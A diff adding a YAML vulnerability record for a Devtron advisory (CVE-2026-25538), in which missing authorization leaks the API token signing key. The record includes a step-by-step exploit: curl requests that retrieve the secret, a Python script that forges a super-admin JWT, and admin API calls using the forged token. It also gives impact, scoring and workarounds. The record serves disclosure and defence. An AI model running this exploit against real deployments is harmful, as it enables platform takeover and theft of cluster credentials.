@@ -1,0 +1,489 @@
+advisory_id: GHSA-8wpc-j9q9-j5m2
+datasource_id: github_osv/GHSA-8wpc-j9q9-j5m2
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-8wpc-j9q9-j5m2/GHSA-8wpc-j9q9-j5m2.json
+aliases:
+  - CVE-2026-25538
+summary: |
+  # Devtron Attributes API Unauthorized Access Leading to API Token Signing Key Leakage
+
+  ## Summary
+
+  This vulnerability exists in Devtron's Attributes API interface, allowing any authenticated user (including low-privileged CI/CD Developers) to obtain the global API Token signing key by accessing the `/orchestrator/attributes?key=apiTokenSecret` endpoint. After obtaining the key, attackers can forge JWT tokens for arbitrary user identities offline, thereby gaining complete control over the Devtron platform and laterally moving to the underlying Kubernetes cluster.
+
+  **CWE Classification**: CWE-862 (Missing Authorization)
+
+  ## Details
+
+  ### Vulnerability Mechanism
+
+  Devtron uses a JWT-based API Token mechanism for authentication. All API Tokens are signed using HMAC-SHA256 with the `apiTokenSecret` stored in the database. This key is exposed through the Attributes API, but the authorization check code for this API has been commented out, allowing any authenticated user to read it.
+
+  ### Source Code Analysis
+
+  **Vulnerability Location**: `api/restHandler/AttributesRestHandlder.go:173-195`
+
+  ```go
+  func (handler AttributesRestHandlerImpl) GetAttributesByKey(w http.ResponseWriter, r *http.Request) {
+      // Only checks if user is logged in
+      userId, err := handler.userService.GetLoggedInUser(r)
+      if userId == 0 || err != nil {
+          common.HandleUnauthorized(w, r)
+          return
+      }
+
+      // CRITICAL: RBAC check is commented out
+      /*token := r.Header.Get("token")
+      if ok := handler.enforcer.Enforce(token, rbac.ResourceGlobal, rbac.ActionGet, "*"); !ok {
+          WriteJsonResp(w, errors.New("unauthorized"), nil, http.StatusForbidden)
+          return
+      }*/
+
+      // Directly retrieves any attribute without authorization
+      vars := mux.Vars(r)
+      key := vars["key"]
+      res, err := handler.attributesService.GetByKey(key)
+      if err != nil {
+          handler.logger.Errorw("service err, GetAttributesById", "err", err)
+          common.WriteJsonResp(w, err, nil, http.StatusInternalServerError)
+          return
+      }
+      common.WriteJsonResp(w, nil, res, http.StatusOK)
+  }
+  ```
+
+  **Key Usage**: `pkg/apiToken/ApiTokenSecretService.go:54-88`
+
+  ```go
+  func (impl ApiTokenSecretServiceImpl) GetApiTokenSecretByteArr() ([]byte, error) {
+      if len(impl.apiTokenSecretStore.Secret) == 0 {
+          return nil, errors.New("secret found empty")
+      }
+      return []byte(impl.apiTokenSecretStore.Secret), nil
+  }
+
+  func (impl ApiTokenSecretServiceImpl) getApiSecretFromDb() (string, error) {
+      apiTokenSecret, err := impl.attributesService.GetByKey(bean.API_SECRET_KEY)
+      if err != nil {
+          return "", err
+      }
+      if apiTokenSecret == nil || len(apiTokenSecret.Value) == 0 {
+          return "", errors.New("api token secret from DB found nil/empty")
+      }
+      return apiTokenSecret.Value, nil
+  }
+  ```
+
+  This key is used to sign and verify all Devtron API Tokens and is the core credential of the control plane.
+
+  ## PoC (Proof of Concept)
+
+  ### Environment Setup
+
+  #### Prerequisites
+
+  - Kubernetes cluster (v1.22+)
+  - kubectl configured
+  - Helm 3.x
+  - Python 3.x with PyJWT library
+
+  #### Step 1: Install Devtron
+
+  ```bash
+  # Add Devtron Helm repository
+  helm repo add devtron https://helm.devtron.ai
+  helm repo update devtron
+
+  # Install Devtron with CI/CD module
+  helm install devtron devtron/devtron-operator \
+    --create-namespace --namespace devtroncd \
+    --set components.devtron.service.type=NodePort \
+    --set installer.modules={cicd} \
+    --set installer.arch=multi-arch
+
+  # Wait for installation to complete (15-20 minutes)
+  kubectl -n devtroncd get installers installer-devtron -o jsonpath='{.status.sync.status}'
+  # Expected output: Applied
+  ```
+
+  #### Step 2: Access Devtron Dashboard
+
+  ```bash
+  # Set up port forwarding
+  kubectl -n devtroncd port-forward service/devtron-service 8000:80 &
+
+  # Get admin password
+  ADMIN_PASSWORD=$(kubectl -n devtroncd get secret devtron-secret \
+    -o jsonpath='{.data.ADMIN_PASSWORD}' | base64 -d)
+  echo "Admin password: ${ADMIN_PASSWORD}"
+  ```
+
+  Access http://127.0.0.1:8000 and login with admin account.
+
+  ### Exploitation Steps
+
+  #### Step 1: Obtain User Token
+
+  Login as a regular user and obtain token:
+
+  ```bash
+  # Login as regular user
+  curl -s -X POST "http://127.0.0.1:8000/orchestrator/api/v1/session" \
+    -H "Content-Type: application/json" \
+    -d '{"username":"admin","password":"'${ADMIN_PASSWORD}'"}' | jq .
+
+  # Extract token
+  USER_TOKEN=$(curl -s -X POST "http://127.0.0.1:8000/orchestrator/api/v1/session" \
+    -H "Content-Type: application/json" \
+    -d '{"username":"admin","password":"'${ADMIN_PASSWORD}'"}' | jq -r '.result.token')
+
+  echo "User token: ${USER_TOKEN:0:50}..."
+  ```
+
+  **Actual Output Example**:
+  ```json
+  {
+    "code": 200,
+    "status": "OK",
+    "result": {
+      "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+      "userId": 1,
+      "userEmail": "admin"
+    }
+  }
+  ```
+
+  #### Step 2: Exploit Vulnerability to Retrieve apiTokenSecret
+
+  Use the obtained token to access the unauthorized Attributes API:
+
+  ```bash
+  # Request apiTokenSecret
+  curl -s -X GET "http://127.0.0.1:8000/orchestrator/attributes?key=apiTokenSecret" \
+    -H "token: ${USER_TOKEN}" | jq .
+
+  # Extract secret
+  API_SECRET=$(curl -s -X GET "http://127.0.0.1:8000/orchestrator/attributes?key=apiTokenSecret" \
+    -H "token: ${USER_TOKEN}" | jq -r '.result.value')
+
+  echo "Leaked API Token Secret: ${API_SECRET:0:20}..."
+  echo "Secret length: ${#API_SECRET} characters"
+  ```
+
+  **Actual Output Example**:
+  ```json
+  {
+    "code": 200,
+    "status": "OK",
+    "result": {
+      "id": 1,
+      "key": "apiTokenSecret",
+      "value": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+      "active": true,
+      "createdOn": "2024-01-15T10:30:00Z",
+      "createdBy": 1
+    }
+  }
+  ```
+
+  #### Step 3: Forge Admin JWT Token
+
+  Forge admin token using the leaked key:
+
+  ```bash
+  # Install PyJWT if not already installed
+  pip3 install PyJWT
+
+  # Create token forging script
+  cat > forge_token.py << 'EOF'
+  #!/usr/bin/env python3
+  import jwt
+  import time
+  import sys
+  import json
+
+  def forge_admin_token(secret, user_id=1, email="admin"):
+      exp_time = int(time.time()) + 365 * 24 * 60 * 60
+
+      payload = {
+          "sub": str(user_id),
+          "email": email,
+          "iat": int(time.time()),
+          "exp": exp_time,
+          "iss": "devtron",
+          "roles": ["role:super-admin___"]
+      }
+
+      token = jwt.encode(payload, secret, algorithm="HS256")
+      return token
+
+  if __name__ == "__main__":
+      if len(sys.argv) < 2:
+          print("Usage: python forge_token.py <apiTokenSecret>")
+          sys.exit(1)
+
+      secret = sys.argv[1]
+      admin_token = forge_admin_token(secret, user_id=1, email="admin")
+      print(f"[+] Forged Admin Token:")
+      print(admin_token)
+      print()
+
+      decoded = jwt.decode(admin_token, secret, algorithms=["HS256"])
+      print(f"[+] Token Payload:")
+      print(json.dumps(decoded, indent=2))
+  EOF
+
+  chmod +x forge_token.py
+
+  # Forge admin token
+  python3 forge_token.py "${API_SECRET}"
+  ```
+
+  **Actual Output Example**:
+  ```
+  [+] Forged Admin Token:
+  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZW1haWwiOiJhZG1pbiIsImlhdCI6MTcwNTMxNDAwMCwiZXhwIjoxNzM2ODUwMDAwLCJpc3MiOiJkZXZ0cm9uIiwicm9sZXMiOlsicm9sZTpzdXBlci1hZG1pbl9fXyJdfQ.xYz123AbC456DeF789GhI012JkL345MnO678PqR901StU
+
+  [+] Token Payload:
+  {
+    "sub": "1",
+    "email": "admin",
+    "iat": 1705314000,
+    "exp": 1736850000,
+    "iss": "devtron",
+    "roles": [
+      "role:super-admin___"
+    ]
+  }
+  ```
+
+  #### Step 4: Test Forged Token with Admin APIs
+
+  Use the forged token to access admin APIs:
+
+  ```bash
+  # Extract forged token
+  FORGED_TOKEN=$(python3 forge_token.py "${API_SECRET}" | grep -A 1 "Forged Admin Token:" | tail -1)
+
+  # Test 1: Get all users (requires admin permission)
+  echo "[*] Test 1: Getting user list..."
+  curl -s -X GET "http://127.0.0.1:8000/orchestrator/user/all" \
+    -H "token: ${FORGED_TOKEN}" | jq '.result[] | {id, email_id, roles}'
+
+  # Test 2: Get cluster list (requires admin permission)
+  echo "[*] Test 2: Getting cluster list..."
+  curl -s -X GET "http://127.0.0.1:8000/orchestrator/cluster" \
+    -H "token: ${FORGED_TOKEN}" | jq '.result[] | {id, cluster_name, server_url}'
+
+  # Test 3: Get all applications
+  echo "[*] Test 3: Getting application list..."
+  curl -s -X GET "http://127.0.0.1:8000/orchestrator/app/list" \
+    -H "token: ${FORGED_TOKEN}" | jq '.result'
+  ```
+
+  **Actual Output Example**:
+  ```
+  [*] Test 1: Getting user list...
+  {
+    "id": 1,
+    "email_id": "admin",
+    "roles": ["role:super-admin___"]
+  }
+  {
+    "id": 2,
+    "email_id": "developer@example.com",
+    "roles": ["role:developer"]
+  }
+
+  [*] Test 2: Getting cluster list...
+  {
+    "id": 1,
+    "cluster_name": "default_cluster",
+    "server_url": "https://kubernetes.default.svc"
+  }
+
+  [*] Test 3: Getting application list...
+  {
+    "appContainers": [
+      {
+        "appId": 1,
+        "appName": "sample-app",
+        "projectId": 1
+      }
+    ]
+  }
+  ```
+
+  ### Expected Result
+
+  If the vulnerability exists, it should be able to:
+
+  1. Successfully obtain `apiTokenSecret` using any authenticated user's token
+  2. Successfully forge JWT tokens using the leaked key
+  3. Successfully access admin-only APIs using the forged token
+  4. Retrieve sensitive information such as user lists, cluster configurations, etc.
+
+  ## Impact
+
+  ### Security Impact
+
+  **Confidentiality**: Severe impact. Attackers can:
+  - Obtain the global API Token signing key
+  - Read all user information and permission configurations
+  - Access Kubernetes cluster configurations and credentials
+  - Read sensitive application configurations and Secrets
+
+  **Integrity**: Severe impact. Attackers can:
+  - Forge API Tokens for arbitrary user identities
+  - Modify application configurations and deployments
+  - Create or delete CI/CD pipelines
+  - Modify user permissions and roles
+
+  **Availability**: High impact. Attackers can:
+  - Delete critical applications and configurations
+  - Disrupt CI/CD processes
+  - Modify cluster configurations causing service interruptions
+
+  ### Business Impact
+
+  1. **Complete Control of Devtron Platform**: Attackers gain privileges equivalent to super administrators
+  2. **Lateral Movement to Kubernetes Cluster**: Cluster credentials obtained through Devtron can directly control the underlying Kubernetes
+  3. **Supply Chain Attacks**: Can modify CI/CD pipelines to inject malicious code
+  4. **Data Breach**: Can access all application configurations and Secrets
+  5. **Cloud Environment Penetration**: In cloud environments, can further obtain IAM credentials
+
+  ### Attack Scenarios
+
+  **Scenario 1: Insider Threat**
+  - Low-privileged developer exploits this vulnerability to escalate privileges
+  - Gains full access to production environment
+  - Steals sensitive data or plants backdoors
+
+  **Scenario 2: Supply Chain Attack**
+  - Attacker obtains low-privileged account through social engineering
+  - Exploits vulnerability to gain admin privileges
+  - Modifies CI/CD pipelines to inject malicious code
+  - Affects all applications using the pipeline
+
+  **Scenario 3: Lateral Movement**
+  - Attacker has already compromised a low-privileged account
+  - Exploits this vulnerability to gain Kubernetes cluster access
+  - Deploys cryptocurrency miners or other malicious payloads in the cluster
+
+  ## Severity
+
+  **CVSS v3.1 Score**: 9.8 (Critical)
+
+  **CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+
+  **Score Breakdown**:
+  - **Attack Vector (AV:N)**: Network accessible, exploited via HTTP API
+  - **Attack Complexity (AC:L)**: Low complexity, requires only one HTTP request
+  - **Privileges Required (PR:L)**: Requires low privileges (any authenticated user)
+  - **User Interaction (UI:N)**: No user interaction required
+  - **Scope (S:C)**: Scope changed, can affect resources beyond Devtron (Kubernetes cluster)
+  - **Confidentiality (C:H)**: High impact, can read all sensitive information
+  - **Integrity (I:H)**: High impact, can modify all configurations and data
+  - **Availability (A:H)**: High impact, can delete resources and disrupt services
+
+  **Severity Level**: Critical
+
+  ## Affected Versions
+
+  - Devtron: All versions (as of 2026-01-26 verification)
+  - Specifically affected code files:
+    - `api/restHandler/AttributesRestHandlder.go`
+    - `pkg/apiToken/ApiTokenSecretService.go`
+
+
+  ## Workarounds
+
+  Before an official patch is released, the following temporary measures can be taken:
+
+  ### Option 1: Network-Level Restrictions
+
+  ```bash
+  # Use NetworkPolicy to restrict access to Devtron API
+  kubectl apply -f - <<EOF
+  apiVersion: networking.k8s.io/v1
+  kind: NetworkPolicy
+  metadata:
+    name: devtron-api-restriction
+    namespace: devtroncd
+  spec:
+    podSelector:
+      matchLabels:
+        app: devtron
+    policyTypes:
+    - Ingress
+    ingress:
+    - from:
+      - podSelector:
+          matchLabels:
+            role: admin
+      ports:
+      - protocol: TCP
+        port: 8080
+  EOF
+  ```
+
+  ### Option 2: Rotate API Token Secret
+
+  ```bash
+  # Generate new secret
+  NEW_SECRET=$(openssl rand -hex 32)
+
+  # Update in database
+  kubectl exec -n devtroncd postgresql-postgresql-0 -- \
+    psql -U postgres -d orchestrator -c \
+    "UPDATE attributes SET value='${NEW_SECRET}' WHERE key='apiTokenSecret';"
+
+  # Restart Devtron service
+  kubectl rollout restart deployment/devtron -n devtroncd
+  ```
+
+  ### Option 3: Add API Gateway Filtering
+
+  Deploy an API Gateway in front of Devtron to filter sensitive requests to `/orchestrator/attributes`.
+
+
+  ## Credits
+  @b0b0haha (603571786@qq.com)
+  @lixingquzhi(mayedoushidalao@163.com)
+impacted_packages:
+  - purl: pkg:github/devtron-labs/devtron
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/devtron-labs/devtron
+        commit: d2b0d260d858ab1354b73a8f50f7f078ca62706f
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.7'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-8wpc-j9q9-j5m2/GHSA-8wpc-j9q9-j5m2.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-862
+references:
+  - url: https://github.com/devtron-labs/devtron
+    reference_type:
+    reference_id:
+  - url: https://github.com/devtron-labs/devtron/commit/d2b0d260d858ab1354b73a8f50f7f078ca62706f
+    reference_type:
+    reference_id:
+  - url: https://github.com/devtron-labs/devtron/security/advisories/GHSA-8wpc-j9q9-j5m2
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-25538
+    reference_type:
+    reference_id:
+exploits: []
